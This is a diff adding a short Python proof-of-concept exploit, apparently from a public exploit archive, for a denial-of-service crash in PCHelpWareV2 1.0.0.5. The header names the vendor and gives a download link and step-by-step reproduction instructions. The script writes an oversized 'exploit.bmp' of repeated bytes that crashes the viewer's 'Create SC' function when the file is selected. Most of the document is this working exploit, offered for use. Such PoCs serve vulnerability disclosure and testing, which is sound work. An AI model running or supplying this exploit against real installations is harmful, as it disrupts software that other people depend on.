@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: PCHelpWareV2 1.0.0.5 - 'SC' Denial of Service (PoC)
+# Date: 15/04/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.uvnc.com/home.html
+# Software Link: http://www.uvnc.eu/download/pchw2/PCHelpWareV2.msi
+# Version: 1.0.0.5
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "PCHelpWareV2_create_.py", it will create a image "exploit.bmp"
+# 2.- Open PCHelpWareV2 Viewer
+# 3.- Go to Tools -> Create SC
+# 4.- Click on button -> Browse (any "Browse" button), and select the 'exploit.bmp' image created
+# 5.- Click on button -> Create SC
+# 6.- Crashed
+
+buffer = "\x41" * 10000
+
+f = open ("exploit.bmp", "w")
+f.write(buffer)
+f.close()
